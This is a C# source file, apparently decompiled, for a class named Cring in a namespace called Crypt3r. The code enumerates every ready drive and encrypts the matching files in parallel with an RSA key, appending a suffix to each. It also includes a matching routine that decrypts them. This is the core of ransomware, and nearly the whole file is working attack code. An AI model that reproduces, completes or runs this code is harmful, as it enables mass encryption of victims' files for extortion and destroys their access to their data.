using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using Alphaleonis.Win32.Filesystem;
using FileUtils;

namespace Crypt3r;

public class Cring
{
	private List<string> Filters;

	private string Suffix;

	private string RSAKey;

	public string SkipStr;

	public bool verbose;

	public Cring(List<string> filters, string rsaKey, string suffix)
	{
		Filters = filters;
		RSAKey = rsaKey;
		Suffix = suffix;
	}

	public Cring(List<string> filters, string rsaKey, string suffix, string skipStr)
	{
		Filters = filters;
		RSAKey = rsaKey;
		Suffix = suffix;
		SkipStr = skipStr;
	}

	public void CryFiles()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady)
			{
				CryFiles(driveInfo.RootDirectory.FullName);
			}
		}
	}

	public void CryFiles(string folder)
	{
		Console.WriteLine("[*] Start " + folder + " ...");
		try
		{
			IEnumerable<string> enumerable = FileSeeker.EnumFiles(folder, Filters);
			if (verbose)
			{
				Console.WriteLine($"{folder}\tFiles:{enumerable.Count()}");
			}
			List<ManualResetEvent> list = new List<ManualResetEvent>();
			int num = 0;
			WaitHandle[] waitHandles;
			foreach (string f in enumerable)
			{
				num++;
				ManualResetEvent resetEvt = new ManualResetEvent(initialState: false);
				ThreadPool.QueueUserWorkItem(delegate
				{
					CryFile(f);
					resetEvt.Set();
				});
				list.Add(resetEvt);
				if (num > 62)
				{
					waitHandles = list.ToArray();
					WaitHandle.WaitAll(waitHandles);
					num = 0;
					list.Clear();
				}
			}
			waitHandles = list.ToArray();
			WaitHandle.WaitAll(waitHandles);
		}
		catch (Exception e)
		{
			HandleError(e);
		}
	}

	public void CryFile(object filepath)
	{
		if (!string.IsNullOrEmpty(SkipStr) && filepath.ToString()!.Contains(SkipStr))
		{
			return;
		}
		try
		{
			string text = filepath.ToString();
			string text2 = text + Suffix;
			if (!File.Exists(text2) && !text.EndsWith(Suffix))
			{
				FileInfo fileInfo = new FileInfo(filepath.ToString());
				if (verbose)
				{
					Console.WriteLine($"[*] {filepath} [{fileInfo.Length}]");
				}
				Handler handler = ((fileInfo.Length < LargeHandler.MBIT_SIZE * 50) ? ((Handler)new CommonHandler(RSAKey, text, text2)) : ((Handler)new LargeHandler(RSAKey, text, text2)));
				handler.EncryptFile();
			}
		}
		catch (Exception e)
		{
			HandleError(e);
		}
	}

	public void DeCryFiles()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.RootDirectory.Exists)
			{
				DeCryFiles(driveInfo.RootDirectory.FullName);
			}
		}
	}

	public void DeCryFiles(string folder)
	{
		try
		{
			foreach (string item in FileSeeker.EnumEncFiles(folder, Filters))
			{
				DeCryFile(item);
			}
		}
		catch
		{
		}
	}

	public void DeCryFile(string filepath)
	{
		try
		{
			string oF = filepath.Substring(0, filepath.LastIndexOf("."));
			if (File.Exists(filepath))
			{
				Console.WriteLine("[+] " + filepath);
				Handler handler = ((!(new CommonHandler(RSAKey, oF, filepath).ReadKeyInfo().Info == "nothing")) ? ((Handler)new LargeHandler(RSAKey, oF, filepath)) : ((Handler)new CommonHandler(RSAKey, oF, filepath)));
				handler.DecryptFile();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("[x] " + ex.Message);
		}
	}

	public void HandleError(Exception e)
	{
		if (verbose)
		{
			Console.WriteLine("[x] " + e.Message);
		}
	}
}
